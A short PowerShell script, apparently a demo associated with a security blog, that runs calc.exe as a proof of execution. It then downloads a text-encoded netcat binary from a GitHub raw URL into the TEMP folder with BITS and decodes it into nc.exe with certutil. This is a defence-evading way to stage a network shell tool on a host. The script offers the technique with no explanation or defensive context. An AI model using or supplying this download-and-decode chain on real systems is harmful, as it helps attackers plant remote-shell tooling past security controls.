#example
powershell calc.exe

#echo "Securethelogs.com" >> "C:\temp\important_document.txt"
#Start-Process powershell.exe "C:\temp\important_document.txt"

Start-BitsTransfer -Source 'https://raw.githubusercontent.com/securethelogs/Powershell/master/Tools/nc.exe'-Destination $env:TEMP\nc.exe.txt
certutil -decode $env:TEMP\nc.exe.txt $env:TEMP\nc.exe
